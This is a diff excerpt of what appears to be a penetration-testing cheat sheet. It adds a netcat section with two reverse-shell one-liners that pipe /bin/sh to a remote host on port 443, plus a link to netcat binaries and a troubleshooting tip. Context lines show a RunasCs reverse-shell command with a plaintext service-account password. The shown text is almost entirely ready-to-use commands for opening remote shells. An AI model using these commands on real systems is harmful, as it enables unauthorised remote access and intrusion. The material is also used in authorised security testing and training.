@@ -120,6 +120,21 @@ Reverse shell :
 Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 192.168.49.55:443
 ```
 
+#### ➤ NC
+
+netcat linux binaries : https://github.com/H74N/netcat-binaries/tree/master/build
+
+```
+nc 192.168.0.1 443 -e /bin/sh
+nc -c /bin/sh 192.168.0.1 443
+```
+
+Famous error :
+```
+Segmentation fault (core dumped)
+
+In this case, use the nc32 version rather than nc64 version
+```
 
 ## 🔻Single line Webshell
 
